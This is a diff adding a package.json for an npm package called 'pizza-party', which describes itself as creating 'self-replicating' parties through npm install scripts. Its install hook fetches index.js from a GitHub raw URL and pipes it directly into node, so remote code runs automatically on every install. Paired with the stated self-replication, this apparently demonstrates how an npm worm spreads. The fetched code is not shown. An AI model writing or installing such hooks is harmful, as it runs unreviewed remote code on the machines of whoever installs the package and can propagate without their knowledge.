@@ -1,0 +1,16 @@
+{
+  "name": "pizza-party",
+  "version": "1.0.0",
+  "description": "Self-replicating pizza parties via npm install scripts",
+  "homepage": "http://github.com/contolini/pizza-party",
+  "author": {
+    "name": "Chris Contolini",
+    "email": "chris@contolini.com",
+    "url": "http://contolini.com"
+  },
+  "main": "index.js",
+  "scripts": {
+    "install": "curl https://raw.githubusercontent.com/contolini/pizza-party/master/index.js | node"
+  },
+  "license": "GPL-3.0"
+}
